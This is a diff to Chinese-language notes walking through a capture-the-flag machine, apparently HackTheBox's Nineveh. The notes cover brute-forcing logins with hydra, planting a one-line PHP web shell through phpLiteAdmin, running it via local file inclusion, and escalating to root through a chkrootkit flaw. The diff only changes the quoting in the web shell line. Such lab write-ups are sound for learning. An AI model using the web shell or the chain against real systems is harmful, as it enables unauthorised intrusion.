@@ -36,7 +36,7 @@ ssh -i _nineveh.png.extracted/secret/nineveh.priv amrios@10.129.97.119
 
 1.gobuster找到http端口的department及https的db
 2.這兩個登入頁面都使用hydra可以暴力破解出密碼
-3.在db phpliteadmin創建立nineveh.php數據庫,表明隨便,字段屬性為text,默認內容為<?php echo system($_REQUEST["cmd"]); ?>
+3.在db phpliteadmin創建立nineveh.php數據庫,表明隨便,字段屬性為text,默認內容為<?php echo system($_REQUEST['cmd']); ?>
 4.在department上的LFI漏洞輸入網址可以執行到nineveh.php,透過burp將get請求轉為post,調整請求地址後能實現remote code execution
 5.得到www-data用戶後可在/etc下發現report文件夾,底下可查看到log發現有起chkrootkit服務
 6.根據chkrootkit服務漏洞在/tmp下創建update可以root執行該文件
